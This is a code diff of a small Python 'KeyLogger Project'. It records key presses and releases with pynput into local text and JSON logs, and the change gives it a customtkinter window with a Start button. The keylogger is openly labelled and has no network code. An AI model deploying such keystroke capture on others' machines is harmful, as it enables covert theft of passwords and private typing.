@@ -1,12 +1,14 @@
 import tkinter as tk
 from tkinter import *
+import customtkinter
 from pynput import keyboard
 import json
 
-root = tk.Tk()
-root.geometry("150*200")
-root.title("KeyLogger Project")
+customtkinter.set_default_color_theme("green")
 
+root = customtkinter.CTk()
+root.geometry("300x400")
+root.title("KeyLogger Project")
 
 key_list = []
 x = False #Value to determine if held
@@ -49,11 +51,15 @@ def on_release(key):
     key_strokes = key_strokes + str(key)
     update_txt_file(str(key_strokes))
 
-print("[+] Running Keylogger Successfuly!\n[!] Saving the Released key logs in 'logs.txt\n[!] Saving the Pressed, Held and Released key logs in 'logs.json'")
+def butaction():
 
-with keyboard.Listener(
-        on_press = on_press,
-        on_release = on_release) as listener:
-    listener.join()
+    print("[+] Running Keylogger Successfuly!\n[!] Saving the Released key logs in 'logs.txt\n[!] Saving the Pressed, Held and Released key logs in 'logs.json'")
 
-                
+    with keyboard.Listener(
+            on_press = on_press,
+            on_release = on_release) as listener:
+        listener.join()
+
+button = customtkinter.CTkButton(root, text = "Start", command = butaction)
+button.place(relx = 0.5, rely = 0.5, anchor = CENTER)
+root.mainloop()
